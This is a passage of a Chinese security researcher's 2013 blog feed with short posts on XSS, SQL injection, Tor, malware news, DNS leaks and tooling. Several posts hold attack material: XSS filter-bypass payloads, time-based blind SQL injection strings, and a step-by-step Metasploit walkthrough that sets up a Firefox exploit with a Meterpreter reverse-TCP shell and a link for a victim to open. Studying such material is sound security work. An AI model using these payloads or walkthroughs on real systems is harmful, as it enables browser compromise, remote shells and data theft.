&lt;p&gt;那么最后，我们从这个故事中得到的启发是什么呢。如果你有一个笔记本用来操作大量的钱，那么一定要好好看好它。如果要暂时离开，首先要锁定电脑。硬盘最好加密，避免离线访问。不要用它来上网打游戏，单独买一个笔记本吧。现在笔记本那么便宜。不管你是职业扑克玩家还是商业领袖，采取这些措施还有还是必要的。&lt;/p&gt;</description>
                <link>http://username.github.io/2013/12/12/sharkinghigh-roller-in-the-crosshairs</link>
                <guid>http://username.github.io/2013/12/12/sharkinghigh-roller-in-the-crosshairs</guid>
                <pubDate>2013-12-12T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>一个xss点的分析</title>
                <description>&lt;p&gt;可以输入img标签，但是过滤了script，alert，等关键字，以及onload。onclick等。而且有字符限制30个字符。尝试通过十进制编码，以及\绕过。（话说\n绕过关键字过滤？）编码没有绕过过滤。所有就没有新的思路了。关键字过滤而且限制了长度。~&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&amp;lt;img src=@ onerror=alert(1)&amp;gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;会转换为&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&amp;lt;img src=&amp;quot;@…&amp;lt;/a&amp;quot;&amp;gt;&amp;lt;/img&amp;gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;使用&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&amp;lt;img src=@\&amp;quot;aaa onerror=alert(1)&amp;gt; 绕过&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;http://zone.wooyun.org/content/8973&lt;/p&gt;</description>
                <link>http://username.github.io/2013/12/11/xss</link>
                <guid>http://username.github.io/2013/12/11/xss</guid>
                <pubDate>2013-12-11T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>kali安装nessus</title>
                <description></description>
                <link>http://username.github.io/2013/12/11/kalinessus</link>
                <guid>http://username.github.io/2013/12/11/kalinessus</guid>
                <pubDate>2013-12-11T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>一个oracle报错</title>
                <description>&lt;p&gt;参数加3个单引号的时候报错：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;ORA-01756: quoted string not properly terminated&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;加一个单引号一个双引号的时候&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;ORA-01740: missing double quote in identifier&lt;/code&gt;&lt;/pre&gt;</description>
                <link>http://username.github.io/2013/12/09/oracle</link>
                <guid>http://username.github.io/2013/12/09/oracle</guid>
                <pubDate>2013-12-09T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>The fbi tor exploit</title>
                <description>&lt;p&gt;http://resources.infosecinstitute.com/fbi-tor-exploit/&lt;/p&gt;

&lt;p&gt;Tor网络是一种允许用户匿名访问网站和其他服务的网络。在这个网络中，存在一种称为黑暗网络（darknet）的服务，从论坛到电子邮件都有，这些服务是只有通过tor才可以访问。&lt;/p&gt;

&lt;p&gt;Tor通过志愿者提供的3000多个中继传输网络流量从而隐藏真实用户的位置信息。尽管Tor网络上的很多服务都是清白的，但是它的匿名性也吸引了很多具有犯罪意图的人，比如传播儿童色情的组织。&lt;/p&gt;

&lt;p&gt;出生于美国的Eric Eoin Marques居住在爱尔兰的都柏林，他是Freedom Hosting的首席架构师，而Freedom Hosting在欧洲的550台服务器被指控用来托管儿童色情网站。&lt;/p&gt;

&lt;p&gt;Freedom Hosting就是Tor网络上的一个重要的服务提供商。它的服务只能通过tor网络来访问。因为它涉嫌违法的事情，所以Tor的负责人还特地发表过声明，称他们跟运营Freedom Hosting的人没有任何关系。声明如下：&lt;/p&gt;

&lt;p&gt;“运营Freedom Hosting的人或组织跟开发Tor软件的团队没有任何关联和隶属关系。过去，曾有敌对的组织试图绕过tor隐藏的服务，直接攻击tor网络背后服务器上的软件。通常都是利用php，mysql和其他的软件的漏洞而不是tor本身的漏洞。最近有消息表明，有人成功利用了Freedom Hosting背后的软件漏洞。据我们所知是利用了Firefox 17 ESR的一个bug，tor浏览器就是基于这个firefox版本的。我们会研究这些bug，并尽快修复他们。&lt;/p&gt;

&lt;p&gt;FBI利用了firefox17的一个漏洞，成功追踪到了Freedom Hosting的服务器。它使用的payload是收集电脑的MAC地址和hostname，然后通过http协议发送到自己控制的服务器上从而获得真实的ip地址。&lt;/p&gt;

&lt;p&gt;Mozilla Firefox 小于22.0的版本，Firefox ESR 17.x，小于17.07的版本，Thunderbird ESR 17.x，小于17.07的版本没有妥善的处理onreadystatechange事件，导致远程攻击者可以拒绝服务攻击（程序crash）或者可能执行任意代码。&lt;/p&gt;

&lt;p&gt;2013年8月份的时候就已经有人在利用这个漏洞攻击Tor browser的用户了。现在msf上已经有利用模块。针对firefox17.06.模块使用说明：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;windows/browser/mozilla_firefox_onreadystatechange:&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img alt='firefox' src='https://raw.github.com/litsand/litsand.github.com/master/_posts/pic/firefox1.png' /&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;输入show options检查这个exp的配置项&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img alt='firefox' src='https://raw.github.com/litsand/litsand.github.com/master/_posts/pic/firefox2.png' /&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;SRVHOST是msf本机的地址，这里配置命令是set SRVHOST 192.168.0.3&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img alt='firefox' src='https://raw.github.com/litsand/litsand.github.com/master/_posts/pic/firefox3.png' /&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;然后设置payloadset PAYLOAD windows/meterpreter/reverse_tcp&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img alt='firefox' src='https://raw.github.com/litsand/litsand.github.com/master/_posts/pic/firefox4.png' /&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;输入show options查看payload的配置项&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img alt='firefox' src='https://raw.github.com/litsand/litsand.github.com/master/_posts/pic/firefox5.png' /&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;设置接受反弹shell的地址 set LHOST 192.168.0.103&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img alt='firefox' src='https://raw.github.com/litsand/litsand.github.com/master/_posts/pic/firefox6.png' /&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;输入run命令开始监听:&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img alt='firefox' src='https://raw.github.com/litsand/litsand.github.com/master/_posts/pic/firefox7.png' /&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;只要让受害者访问这个exp生成的链接就可以了.这里是http://192.168.0.103:8080/2Hek0bdO&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img alt='firefox' src='https://raw.github.com/litsand/litsand.github.com/master/_posts/pic/firefox8.png' /&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;如果对方的浏览器存在漏洞可以看到msf的输出如下：&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img alt='firefox' src='https://raw.github.com/litsand/litsand.github.com/master/_posts/pic/firefox9.png' /&gt;&lt;/p&gt;

&lt;p&gt;参考资料：&lt;/p&gt;

&lt;p&gt;http://rt.com/usa/fbi-exploiting-tor-child-porn-842/&lt;/p&gt;

&lt;p&gt;http://siliconangle.com/blog/2013/08/06/darknet-freedom-hosting-sites-shutdown-led-by-fbi-exploit-use-against-tor-network/&lt;/p&gt;

&lt;p&gt;http://thehackernews.com/2013/08/Firefox-Exploit-Tor-Network-child-pornography-Freedom-Hosting.html&lt;/p&gt;

&lt;p&gt;http://www.rapid7.com/db/modules/exploit/windows/browser/mozilla_firefox_onreadystatechange&lt;/p&gt;

&lt;p&gt;PS：测试总是crash。。。要么是弹出一个对话框卡住，要么就直接crash了。&lt;/p&gt;</description>
                <link>http://username.github.io/2013/12/07/the-fbi-tor-exploit</link>
                <guid>http://username.github.io/2013/12/07/the-fbi-tor-exploit</guid>
                <pubDate>2013-12-07T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>记录一个注入失败</title>
                <description>&lt;p&gt;记录一下，db.178.com发现这个分站有很多sql报错。其实后端有对输入做了一下过滤。只是错误信息还是回显的。&lt;/p&gt;</description>
                <link>http://username.github.io/2013/12/06/</link>
                <guid>http://username.github.io/2013/12/</guid>
                <pubDate>2013-12-06T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>安装pip</title>
                <description>&lt;p&gt;之前在ubuntu上选择easy_install作为python包管理器。最近发现很多安装说明都是用pip。所以准备装一个。apt-get install pip 找不到pip包。&lt;/p&gt;

&lt;p&gt;参考官网：http://www.pip-installer.org/en/latest/installing.html#python-os-support&lt;/p&gt;

&lt;p&gt;步骤：&lt;/p&gt;

&lt;p&gt;Securely download &lt;a href='https://bitbucket.org/pypa/setuptools/raw/bootstrap/ez_setup.py'&gt;ez_setup.py&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Then run the following (which may require administrator access):&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$ python ez_setup.py&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;然后下载&lt;a href='https://raw.github.com/pypa/pip/master/contrib/get-pip.py'&gt;get-pip.py&lt;/a&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;python get-pip.py&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;直接使用包管理器安装：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;apt-get install python-pip
yum install python-pip&lt;/code&gt;&lt;/pre&gt;</description>
                <link>http://username.github.io/2013/12/05/pip</link>
                <guid>http://username.github.io/2013/12/05/pip</guid>
                <pubDate>2013-12-05T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>xdef一些感想</title>
                <description>&lt;p&gt;相关日程和ppt下载：http://www.xdef.org.cn/2013/agenda.html&lt;/p&gt;

&lt;p&gt;按照时间顺序结合ppt回顾一下主要的感受和内容：&lt;/p&gt;

&lt;p&gt;前两个特邀报告没有提供ppt，张焕国教授分享的工业控制系统可信研究我学到的东西就可信计算的这个概念。后面win8的安全也提到了。好像张教授是可信计算领域的专家。现在这个概念也比较流行。不过自己之前确实没有了解过这个东西。&lt;/p&gt;

&lt;p&gt;香港大学的教授分享的信息安全与网络取证。从学术研究以及真实的案例使用角度讲了一些取证的前沿方向。主要是针对一些犯罪证据的考证。而且演讲过程中邹教授还特地讲在法庭上什么样的东西可以作为证据。以及拿陈冠希照片的案件作为例子来讲解一个取证的流程。我感受到的就是香港跟大陆却是不一样，从法律概念的深入人心到做学问的细致。邹教授的ppt一共有100页。有一些不错的概念，值得一看。&lt;/p&gt;

&lt;p&gt;中国科学院信息工程研究所高级工程师仇工分享的是下一代网络威胁监测是apt恶意代码防护。这个可能因为某些原因，没有提供ppt。当时我听的时候觉得讲的很好的。可能是国家这个层面的工程师，每天面对的都是真实的威胁。美国的网络攻击啊，中国有多少电脑被境外控制啊，这些都不再是新闻。是每天都会见到的真实的案例。当时记得仇工讲我们国内的技术实力跟美国什么的比还是差很多的。以及说到国内厂家天天吵的apt防御，记得他好像说在他的角度看来没有一家可以做到防apt的。我个人觉得其实这个是因为不同角度看到的东西不同。这个听完所有的报告之后感觉更加强烈。就是甲方，乙方，第三方，每个人的观点都不一样的。&lt;/p&gt;

&lt;p&gt;金山的另类寻找android寻找恶意应用这个中规中矩。讲利用应用的耗电量来寻找恶意应用。其实这个也是一个很不错的思路。作为科普了解恶意应用很不错。&lt;/p&gt;

&lt;p&gt;360的裤带计划。当然是来做广告的我觉得。不过赵武分享的一些裤带计划的数据也能带来不少启发。裤带计划是360一个收购第三方开源cms漏洞的计划，提交漏洞可以获得现金奖励。赵武分享的了两个与站长的聊天的记录。有站长觉得自己的站被黑客控制挺好的。自己网站出错了，黑客帮忙解决。自己省心。。。。。。最后赵武演示了江湖传说已久的袁哥iis5oday。很不多。&lt;/p&gt;

&lt;p&gt;腾讯的曾泽分享的大型互联网企业安全建设的挑战实践和思考。讲了腾讯的安全体系从无到有，到壮大整个过程。通过漏洞来推动业务的安全意识等。腾讯所有的主机都有一个安全agent。主要功能应该就是采集信息。包括各种日志以及重要操作。然后由中心统一分析。他讲到传到腾讯服务器上的webshell，几分钟之内就会被自动删除。而且腾讯的主机系统不是原生的各种发行版。是自己修改定制的linux系统。&lt;/p&gt;

&lt;p&gt;江海客的apt对安全产品和体系变革驱动的演讲没有提供ppt。当时讲的也比较匆忙，因为一个主题只有40分钟。。。当时觉得讲得的境界还是挺高远的。思考的很深。比如从计算机安全的历史，讲到现在为什么感觉计算机病毒少了。其实计算机病毒的种类依然是快速增长的。只是攻击的场景变了。而不是杀毒软件打败了病毒。&lt;/p&gt;

&lt;p&gt;安全宝首席科学家讲的waf在网站云安全中的应用研究确实是只能用干货来形容。后来吃饭的时候有个哥们跟我说讲的啥都没听懂。一看就是技术宅男。从云waf的技术架构到解决方案都分析的很细。当然也导致受众只能局限在一定的领域。我感兴趣的一点是他们的规则是lua函数。他讲到正则写的规则效率非常低，而lua函数能达到c函数的的效率。而且规则可以更智能。确实牛逼。&lt;/p&gt;

&lt;p&gt;知道创宇的大数据安全新思路。也算是科普吧。数据内容还比较丰富。这种云waf在这种案例方便具有很好的优势。大家可以看看freebuf最近的追踪。http://www.freebuf.com/author/%E5%B0%8F%E5%9C%9F%E9%B8%A1 所以他们在日志内容方便还是很有资源的。&lt;/p&gt;

&lt;p&gt;第二天cncert的副总工程师讲的传统应急响应如何适应高级安全威胁。作为国家这个层面的角度来讲,总是很让人长见识。杜工讲到如何评判一个安全问题，风险与威胁。这个如何判断一个安全漏洞的影响也是大家经常讨论的问题。后面也还会讲到。&lt;/p&gt;

&lt;p&gt;诸葛建伟是清华的研究员。他分享的DEFCONCTF之旅。defconf ctf是一种黑客技术竞赛。在这个领域里是顶尖级别的。他本人也翻译过一些很好的书籍。这个分享普及了一些ctf的知识。也让我们了解到世界顶尖战队的实力。&lt;/p&gt;

&lt;p&gt;乌云论坛发起人剑心的乌云平台视角下的信息安全。这个就比较有意思了。分享了wooyun上影响最重要的漏洞。剑心以前是百度安全的负责人。跟李彦宏上过天天向上。。87年的。。他作为一个第三方的平台一开始讲了几个场景。甲方，乙方，对待一个安全问题看法总是有很多区别。他一直坚持的观点就是评估漏洞应该看对数据的影响。曾举过一个例子，比如一个高端的0day，全世界只有几个人知道。他认为这个是个低危的事件。因为门槛太高。不会造成广泛的影响。但是在之前cncert的演讲提到国家层面的对抗，高级apt肯定是0day，而0day是防不住的。所以哪怕有一个人知道一个0day，也是很高风险的威胁。所以每个人的角度不同，观点也很不一样。&lt;/p&gt;

&lt;p&gt;分享案例：http://www.wooyun.org/bugs/wooyun-2013-041105 重置京东任意用户密码&lt;/p&gt;

&lt;p&gt;后面一个apt攻击及其网络空间防御对策。也算科普把。厂商讲着这个，做推广的成分其实很大。apt无非也就是防0day，多维分析。多维关联。思路基本都是差不多。&lt;/p&gt;

&lt;p&gt;微软互联网安全总监分享的windows8.1安全新特性也是科普。不过了解到一些新东西。比如之后的电脑会强制安装可信计算模块。但是他也讲到攻防是相互的。windows永远都会有漏洞。安全性也是一直在不断提高。&lt;/p&gt;

&lt;p&gt;美亚柏科分享的智能手机系统安全和取证技术。非常不错。这个公司据说是取证领域的很牛逼的公司。而且是上市公司。他的ppt也是有些科普的数据也能了解到其实手机的很多安全问题。比如屏幕锁，这个东西是有很多办法绕过的。&lt;/p&gt;

&lt;p&gt;武汉大学的教授讲了一个密码芯片侧信道分析研究，这儿是学校里的一个科研方向了。就是利用加密过程中芯片产生的磁场变化，温度变化来破解加密密钥。听起来很科幻。不过侧信道的攻击方式在安全领域并不陌生。比如基于时间的盲注其实也是一种侧信道攻击利用。 唐教授分享了她参加世界上最牛逼的侧信道密码芯片分析比赛的过程。因为参加比赛需要一块芯片板。几万块钱。她们经费不够。她就给那个组委会的老大写信，希望他们给她一块板子。写到20几封还是多少封的时候我不记得是不是这么多了。组委会给她寄来了一块板子。然后第一次参加她们就取得还不错的名词。今天又一次比赛。那个组委会的老大写信来邀请她去参加比赛。说只要她愿意参加，板子马上寄过来。很是励志。&lt;/p&gt;

&lt;p&gt;后面一个讲无线电攻击的估计很多人都睡着了。我也没怎么听懂。其实一开始我觉得前面有些人讲的过于科普了。没深度啊。结果这哥们一讲我觉得科普还是不错的。。。他讲了他们如何自己组装一个记录无限信号的攻击设备。成本很低，可以用来破解汽车开锁的信号啥的。领域比较专业。&lt;/p&gt;</description>
                <link>http://username.github.io/2013/12/04/xdef</link>
                <guid>http://username.github.io/2013/12/04/xdef</guid>
                <pubDate>2013-12-04T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>curl_init undefined</title>
                <description>&lt;p&gt;测试一个php的exp，提示curl_init undefined。back track 5和kali都没有这个扩展，一开始想复杂了。以为需要自己安装，调整配置。&lt;/p&gt;

&lt;p&gt;结果&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;apt-get install php5-curl&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;就可以了。包管理器真实牛逼啊。简单易用的工具才是好工具。&lt;/p&gt;

&lt;p&gt;http://www.queryinn.com/index.php/2010/03/fatal-error-call-to-undefined-function-curl_init-windows-and-linux-ubuntu/&lt;/p&gt;</description>
                <link>http://username.github.io/2013/12/03/curl_init-undefined</link>
                <guid>http://username.github.io/2013/12/03/curl_init-undefined</guid>
                <pubDate>2013-12-03T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>jsonp与js hijacking</title>
                <description>&lt;p&gt;http://firstleaf.diandian.com/post/2013-03-18/40049583114&lt;/p&gt;

&lt;p&gt;http://drops.wooyun.org/papers/42&lt;/p&gt;

&lt;p&gt;之前在写cors跨域资源共享的时候看到jsonp，然后在csrf蠕虫中看到callback劫持返回的数据，一直没怎么搞的很清楚状况。今天刚好看到两篇很不错的资料。总结记录一下。&lt;/p&gt;

&lt;p&gt;js-hijacking其实是对jsonp的一种合法使用。是因为服务端验证不全导致的信息泄露。&lt;/p&gt;

&lt;p&gt;应该说是使用自定义的callback函数只是js-hijacking的一种。&lt;/p&gt;</description>
                <link>http://username.github.io/2013/12/02/jsonpjs-hijacking</link>
                <guid>http://username.github.io/2013/12/02/jsonpjs-hijacking</guid>
                <pubDate>2013-12-02T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>java跨平台恶意软件</title>
                <description>&lt;p&gt;最近赛门铁克的安全研究员发现了一款新的针对Tomcat的恶意软件。&lt;/p&gt;

&lt;p&gt;传播示意图：&lt;/p&gt;

&lt;p&gt;&lt;img alt='img' src='https://raw.github.com/litsand/litsand.github.com/master/_posts/pic/java1.png' /&gt;&lt;/p&gt;

&lt;p&gt;这款恶意软件被命名为&amp;#8221;Java.Tomdep&amp;#8221;,跟其他服务器后门不一样的是，不是常见的php写的，而是用java写的后门，作为一个java servlet运行在tomcat上。&lt;/p&gt;

&lt;p&gt;因为java是跨平台的，所以它可以感染Linux，Mac OS X，Solaris和各种版本的windows。一旦机器被感染之后，会继续扫描其他安装了Tomcat的机器，然后尝试暴力破解，感染下一台机器。&lt;/p&gt;

&lt;p&gt;这款恶意软件功能强大。作为一个IRC Bot可以接受攻击者的命令，上传下载文件，创建进程，更新自己，做SOCKS代理，UDP 洪水攻击等等。他们的C&amp;amp;C服务器位于台湾和卢森堡。&lt;/p&gt;

&lt;p&gt;监测到的被感染地区分布如下图：&lt;/p&gt;

&lt;p&gt;&lt;img alt='img' src='https://raw.github.com/litsand/litsand.github.com/master/_posts/pic/java2.png' /&gt;&lt;/p&gt;

&lt;p&gt;更多资料：http://www.symantec.com/connect/blogs/all-your-tomcat-are-belong-bad-guys&lt;/p&gt;</description>
                <link>http://username.github.io/2013/11/29/java</link>
                <guid>http://username.github.io/2013/11/29/java</guid>
                <pubDate>2013-11-29T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>一次分析日志的思考</title>
                <description>&lt;p&gt;一个是系统的登陆日志，这个我想要的结果是每个ip的登陆次数，以及ip的地理位置。登陆时间是否异常。&lt;/p&gt;

&lt;p&gt;分析web日志尝试过滤php文件的访问来查找异常的文件地址。&lt;/p&gt;</description>
                <link>http://username.github.io/2013/11/29/</link>
                <guid>http://username.github.io/2013/11/</guid>
                <pubDate>2013-11-29T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>padding oracle漏洞利用</title>
                <description></description>
                <link>http://username.github.io/2013/11/27/padding-oracle</link>
                <guid>http://username.github.io/2013/11/27/padding-oracle</guid>
                <pubDate>2013-11-27T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>dns记录引起的内网ip泄露</title>
                <description>&lt;p&gt;国外网站今年曾报告发现很多知名互联网企业的DNS记录泄露了部分私网IP地址。存在这个问题的公司有live.com, facebook.com, yahoo.com, nokia.com, paypal.com, baidu.com等等。&lt;/p&gt;

&lt;p&gt;存在的问题就是一些*.COMPANY.com域名指向的地址是10/8,172.16/12,192.168/16和127.0.0.1的内网地址。比如：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;./facebook.com:10.60.0.195 sb.facebook.com
./facebook.com:10.170.0.4 time.facebook.com
./facebook.com:10.78.0.10 time.facebook.com
./facebook.com:10.56.0.7 xmail.facebook.com

./live.com:10.245.6.27 monitoring.live.com

./yahoo.com:10.72.164.31 i.yahoo.com
./yahoo.com:10.80.80.184 na.yahoo.com

./baidu.com:10.11.252.74 accounts.baidu.com
./baidu.com:10.81.7.51 ba.baidu.com
./baidu.com:172.18.100.200 bd.baidu.com
./baidu.com:10.36.155.42 bh.baidu.com
./baidu.com:10.36.160.22 bh.baidu.com
./baidu.com:10.38.19.40 bh.baidu.com
./baidu.com:10.42.7.24 bi.baidu.com
./baidu.com:10.44.64.20 bugs.baidu.com
./baidu.com:10.81.11.67 cd.baidu.com
./baidu.com:10.38.157.31 cdn.baidu.com
./baidu.com:10.26.7.93 cms.baidu.com
./baidu.com:10.26.137.29 com.baidu.com&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;目前已经存在一些利用方式来访问和入侵内网服务。比如cors和ssrf。不过国外的小伙伴提出了一种很有想象力的攻击的方式。&lt;/p&gt;

&lt;p&gt;假设如下一个场景，很多工程师在参加一个技术会议。笔记本连到wifi上。通过泄露的信息得知某著名公司存在一个secbugs.company.com的域名，指向的是192.168.1.199。攻击者只要将自己的电脑搭建成ip为192.168.1.199的服务器。然后就像传统的csrf和反射xss一样，制作一个页面。想办法让company的工程师点击。一旦点击恶意页面，就会发起一个对secbugs.company.com的请求。而这个请求会发送到攻击者的服务器上。从而获得用户的cookie。&lt;/p&gt;</description>
                <link>http://username.github.io/2013/11/27/dnsip</link>
                <guid>http://username.github.io/2013/11/27/dnsip</guid>
                <pubDate>2013-11-27T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>一个注入</title>
                <description>&lt;p&gt;wvs跑出来的注入点。payload是&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;class=if(now()%3dsysdate()%2csleep(0)%2c0)/*&amp;#39;XOR(if(now()%3dsysdate()%2csleep(0)%2c0))OR&amp;#39;%22XOR(if(now()%3dsysdate()%2csleep(0)%2c0))OR%22*/&amp;amp;imageField=&amp;amp;keys=1

(select(0)from(select(sleep(3)))v)/*&amp;#39;+(select(0)from(select(sleep(3)))v)+&amp;#39;&amp;quot;+(select(0)from(select(sleep(3)))v)+&amp;quot;*/&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;测试sleep确实是可以执行的。不过sqlmap的payload跑不出来。&lt;/p&gt;

&lt;p&gt;留下备忘。&lt;/p&gt;</description>
                <link>http://username.github.io/2013/11/27/</link>
                <guid>http://username.github.io/2013/11/</guid>
                <pubDate>2013-11-27T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>利用css伪类暴力破解csrf token</title>
                <description>&lt;p&gt;《web前段黑客技术揭秘》的2.6.3CSS伪类中提到可以利用：visited伪类进行css history攻击。后面有个提问，这个有何危害。当时觉得可以获得用户的浏览记录，也许可以暴力猜测用户的一些内网地址，常用的网站。&lt;/p&gt;

&lt;p&gt;今天看到一个利用css history 破解csrf token。而且有人写出了纯css代码实现。&lt;/p&gt;

&lt;p&gt;http://archive.is/mT45&lt;/p&gt;

&lt;p&gt;不过书上提到这个方式已经被浏览器修补了。&lt;/p&gt;

&lt;p&gt;可见当时的思考是不全面的。这个问题的危害不仅仅是泄露一个地址，确切说是泄露一个url。只要存在url中的信息就有可能被骇客猜到。就是不安全的。所以csrf token放在url里也存在这种风险。&lt;/p&gt;</description>
                <link>http://username.github.io/技术研究/2013/11/26/csscsrf-token</link>
                <guid>http://username.github.io/技术研究/2013/11/26/csscsrf-token</guid>
                <pubDate>2013-11-26T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>关于系统维护盘的思考</title>
                <description>&lt;p&gt;之前把硬盘换成了SSD，原配的硬盘放到了光驱位。不得不说SSD却是效率高多了。不过带来一个问题就是原先装在hd0的windows系统没法使用了。具体原因也没有研究过。本来觉得重新装一个很简单。&lt;/p&gt;

&lt;p&gt;用ghost恢复了一个电脑城装机版。然后引导记录变成windows的。这些都在意料之中。本来准备用easybcd 本地引导ununtu.iso然后修复grub2就可以了。结果死活引导不了。本来应该是（hd1，0），但是显示没有文件，用(hd0,0)才能家在内核，不过提示 mounting /dev/sda /cdrom invalid argument。感觉应该是系统识别硬盘混乱了。然后尝试用easybcd和其他的工具修复引导记录，没有成功。前后花了几个小时。好久没有遇到这么绝望的感觉了。大部分的技术问题，google之后，自己测试下一般都会有答案。这次小小绝望了一下。不过问题总是得解决也总是能解决的。我就把bios恢复默认设置了。恢复默认设置之后，开机的画面不一样了。提示硬盘。。。而且貌似设置启动顺序不管用了。不过让人欣慰的是无意中发现这时候配置的easybcd引导可以成功引导ubuntu.iso。看来果然是添加硬盘之后，系统对硬盘号的识别问题。&lt;/p&gt;

&lt;p&gt;其实这个问题主要是自己就一个winpe来维护系统。应该准备一个安装grub2引导的移动硬盘。然后上面放几个iso。直接usb引导，可以引导任何自己需要的iso。应该就不会花这么时间了。&lt;/p&gt;</description>
                <link>http://username.github.io/2013/11/26/</link>
                <guid>http://username.github.io/2013/11/</guid>
                <pubDate>2013-11-26T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>syslog发送文本文件</title>
                <description>&lt;p&gt;http://www.rsyslog.com/doc/imfile.html&lt;/p&gt;

&lt;p&gt;kali rsyslog 测试通过&lt;/p&gt;

&lt;p&gt;如下配置：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$ModLoad imfile # needs to be done just once
# File 1
$InputFileName /path/to/file1
$InputFileTag tag1:
$InputFileStateFile stat-file1
$InputFileSeverity error
$InputFileFacility local7
$InputRunFileMonitor
# File 2
$InputFileName /path/to/file2
$InputFileTag tag2:
$InputFileStateFile stat-file2
$InputRunFileMonitor
# ... and so on ...
#
# check for new lines every 10 seconds
$InputFilePollInterval 10&lt;/code&gt;&lt;/pre&gt;</description>
                <link>http://username.github.io/2013/11/22/syslog</link>
                <guid>http://username.github.io/2013/11/22/syslog</guid>
                <pubDate>2013-11-22T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>stuxnet secret twin</title>
                <description>&lt;p&gt;http://www.foreignpolicy.com/articles/2013/11/19/stuxnets_secret_twin_iran_nukes_cyber_attack?page=0,0&lt;/p&gt;

&lt;p&gt;震网病毒破坏伊朗核设施过程的负责程度远远超乎所有人的预料。&lt;/p&gt;

&lt;p&gt;从震网病毒发现到现在已经3年多了，作为第一个被曝光的网络武器，时至今日依然让军事战略家，信息安全专家，政治决策者和广大的公众对它感到迷惑不解。我们已经听过它的故事了：它是怎样攻击纳坦兹的伊朗核设施的，它是怎么隐藏的，它是如何违背了制造者的期望从纳坦兹逃离的。但是这个故事的大部分都是不正确或者说是不完整的。&lt;/p&gt;

&lt;p&gt;这是因为震网病毒其实不是一个，而是有两个。大部分的注意力都被那个较简单的攻击程序吸引了，就是改变铀浓缩离心机转子速率的那个。另外一个被“遗忘”的程序复杂度和隐蔽性都高了一个量级。对那些懂得工业工业控制系统安全的人来说可以称得上是一个梦魇。奇怪的是这个更复杂的攻击程序是先出现的，较简单的，被熟知的攻击程序出现在一年以后，他们被发现的时间间隔很短。&lt;/p&gt;

&lt;p&gt;伊朗的核计划成为世界舆论的中心有助于我们理解利用程序破坏这个计划的企图。震网对伊朗核计划的影响尚不清楚，因为没有关于多少控制器被感染的消息传出来。不过，经过深度的分析发现这次攻击的目的在于实现攻击，以及实现攻击的过程。我花了3年时间来做分析，不仅仅是计算机代码，包括被攻击的核工厂环境的物理特点以及这个核工厂运作的流程。我发现的整个全貌，包括震网的第一个和不为人知的变种，会对这次攻击带来一次全新的认识。事实证明震网远比公众认知的网络武器危险的多。&lt;/p&gt;

&lt;p&gt;2007年，有人在VirusTotal上提交了一个程序，后来证明这是第一个震网病毒变种，至少是我们目前已知的第一个。当然，这是在5年之后，掌握了震网的第二个变种的相关知识才意识到的。要是没有后来较简单的版本，可能这个最初的震网到今天还躺在反病毒专家的档案库里。今天，我们已经知道这个程序包含的载体可以严重干扰纳坦兹的铀浓缩工厂里离心机的保护系统。&lt;/p&gt;

